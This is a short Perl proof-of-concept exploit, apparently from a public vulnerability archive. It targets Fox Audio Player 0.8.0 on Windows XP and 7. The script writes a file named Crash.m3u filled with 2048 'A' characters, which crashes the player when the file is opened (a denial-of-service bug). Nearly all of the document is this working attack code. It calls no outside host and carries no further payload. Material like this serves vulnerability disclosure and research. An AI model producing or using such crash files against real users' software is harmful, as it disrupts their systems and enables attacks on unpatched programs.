#
#########################################################################################
#                                                                                       #
#  Title: Fox Audio Player 0.8.0 .m3u Denial of Service Vulnerability                   #
#  Author: 4n0nym0us (Arash Sa'adatfar)                                                 #
#  Developer: Leandro Nini                                                              #
#                                                                                       #
#  Software Link:                                                                       #
#  http://www.softpedia.com/get/Multimedia/Audio/Audio-Players/Fox-Audio-Player.shtml   #
#  Tested On: Windows XP Sp3 32-bit / Windows 7 Ultimate 32-bit                         #
#                                                                                       #
#########################################################################################
#
#!/usr/bin/perl
my $file= "Crash.m3u";
my $junk= "\x41" x 2048;
open($FILE,">$file");
print $FILE $junk;
print "\nCrash.m3u File Created successfully\n";
close($FILE);